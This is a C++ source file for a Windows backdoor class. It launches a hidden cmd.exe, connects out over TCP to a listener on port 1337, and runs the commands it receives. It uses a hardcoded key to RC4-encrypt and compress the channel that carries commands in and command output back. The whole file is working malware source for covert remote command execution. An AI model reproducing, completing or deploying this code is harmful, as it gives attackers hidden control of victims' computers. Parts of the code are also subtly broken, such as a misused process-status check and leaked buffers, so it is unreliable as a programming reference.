#include "BackDoor.h"

void BackDoor::CommandPrompt() {
	secat.nLength = sizeof(SECURITY_ATTRIBUTES);
	secat.bInheritHandle = TRUE;
	DWORD bytesW;             //number of bytes written gets stored here   
	HANDLE newstdin = NULL, newstdout = NULL, readout = NULL, writein = NULL; //the handles for our Pipes   
	char exit1[] = "exit"; //we need this to compare our command to 'exit'   
	char exit2[] = "EXIT"; //we need this to compare our command to 'EXIT'   

	
	// used for rc4 encryption
	const uint8_t* key = (uint8_t*)"FtkvWPDfIdKGWvP5788D4kNeO6FMCXsO";
	const int key_length = 32;


	//create the pipes for our command prompt   
	CreatePipe(&newstdin, &writein, &secat, 0);
	CreatePipe(&readout, &newstdout, &secat, 0);

	GetStartupInfoA(&startinfo);

	startinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	startinfo.wShowWindow = SW_HIDE;
	startinfo.hStdOutput = newstdout;
	startinfo.hStdError = newstdout;
	startinfo.hStdInput = newstdin;

	//start cmd prompt   
	CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &procinfo);

	while (1)
	{
		//check if cmd.exe is still running, if not then cleanup and start listening again.   
		if (GetExitCodeProcess(procinfo.hProcess, &exitcode) == STILL_ACTIVE)
		{
			CloseHandle(procinfo.hThread);
			CloseHandle(procinfo.hProcess);
			CloseHandle(newstdin);
			CloseHandle(writein);
			CloseHandle(readout);
			CloseHandle(newstdout);
			break;
		}
		bytesRead = 0;
		
		//sleep 0.5 seconds to give cmd.exe the chance to startup   
		Sleep(500);

		//check if the pipe already contains something we can write to output   
		PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
		if (bytesRead != 0)
		{
			while (bytesRead != 0)
			{   
				//read data from cmd.exe and send to client, then clear the buffer   
				ReadFile(readout, bufferout, sizeof(bufferout), &bytesRead, NULL);

				// compress first
				std::string compressed_response;

				// const char* input, size_t input_length, std::string* compressed
				snappy::Compress(bufferout, bytesRead, &compressed_response);
				//printf("Compressed: %s\n", &compressed_response[0]);

				// then encrypt
				uint8_t sbox[256];
				uint8_t *encrypted = new uint8_t[compressed_response.length()+1];
				encrypted[compressed_response.length()] = 0;

				generateRC4SBox(sbox, key, key_length);

				RC4(0, 0, 0, 3328, sbox, 0x2); // "Fast forward by 3328 bytes"
				RC4((const uint8_t*)compressed_response.c_str(), encrypted, 0, compressed_response.length(), sbox, 0x2); // The actual encryption is done here.

				//printf("Encrypted: %s\n", encrypted);

				send(locsock, (const char*)encrypted, compressed_response.length(), 0);

				ZeroMemory(bufferout, sizeof(bufferout));

				Sleep(100);
				
				PeekNamedPipe(readout, bufferout, sizeof(bufferout), &bytesRead, &avail, NULL);
			}
		}
		// clear bufferin   
		ZeroMemory(bufferin, sizeof(bufferin));

		//receive the command given   
		int iresult = recv(locsock, bufferin, sizeof(bufferin), 0);


		// decrypt first
		uint8_t sbox[256];
		uint8_t *decrypted= new uint8_t[iresult + 1];
		decrypted[iresult] = 0;

		generateRC4SBox(sbox, key, key_length);

		RC4(0, 0, 0, 3840, sbox, -0x3); // Fast forward by 3840 bytes
		RC4((const uint8_t*)bufferin, decrypted, 0, iresult, sbox, -0x3);

		//printf("Decrypted: %s\n", decrypted);

		// decompression removed
		std::string decompressed_cmd((const char*)decrypted);

		// write the command to cmd.exe   
		WriteFile(writein, decompressed_cmd.c_str(), decompressed_cmd.length(), &bytesW, NULL);
		WriteFile(writein, "\r\n", 2, &bytesW, NULL);

		// if command given is 'exit' or 'EXIT' then we have to capture it to prevent our program    
		// from hanging.   
		if ((strcmp(decompressed_cmd.c_str(), exit1) == 0) || (strcmp(decompressed_cmd.c_str(), exit2) == 0))
		{
			goto closeup;
		}

		//clear the bufferin    
		memset(bufferin, 0, sizeof(bufferin));
	}

// close up all handles    
closeup:
	CloseHandle(procinfo.hThread);
	CloseHandle(procinfo.hProcess);
	CloseHandle(newstdin);
	CloseHandle(writein);
	CloseHandle(readout);
	CloseHandle(newstdout);
}


void BackDoor::startup() {

	port = 1337; //make integer from ascii string   

	//tell windows we want to use sockets   
	WSAStartup(0x101, &wsadata);
	//create socket   
	locsock = socket(AF_INET, SOCK_STREAM, 0);

	//fill structure   
	sinloc.sin_family = AF_INET;
	sinloc.sin_addr.s_addr = inet_addr("127.0.0.1");
	sinloc.sin_port = htons(port);

	//infinite loop here to keep the program listening   
	while (connect(locsock, (sockaddr*)&sinloc, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		//close the socket   
	}

	CommandPrompt();
	closesocket(remsock);
}